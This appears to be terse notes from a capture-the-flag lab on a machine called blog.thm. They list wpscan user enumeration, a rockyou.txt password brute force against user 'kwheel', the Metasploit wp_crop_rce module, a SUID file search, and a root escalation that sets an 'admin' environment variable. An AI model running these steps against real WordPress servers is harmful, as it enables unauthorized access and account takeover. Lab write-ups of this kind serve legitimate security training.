**wpscan — url blog.thm — enumerate u**
**wpscan — url blog.thm -P /usr/share/wordlists/rockyou.txt -U “kwheel”**
exploit/multi/http/wp_crop_rce
find / -perm -4000 2>/dev/null
this is the ltrace output:-

  

getenv("admin") = nil  
puts("Not an Admin"  
    Not an Admin  
  ) = 13  
  ++ + exited(status 0) ++ +  

  

What this "checker" is doing is calling a getenv() on "admin" variable and returning its value i.e. "nil", because the "admin" environment  variable does not exist, so on running "checker" it's giving the output "Not an admin"  

  

We can give admin variable any value to exploit the vulnerability of "checker" and get root privileges.


export admin=hello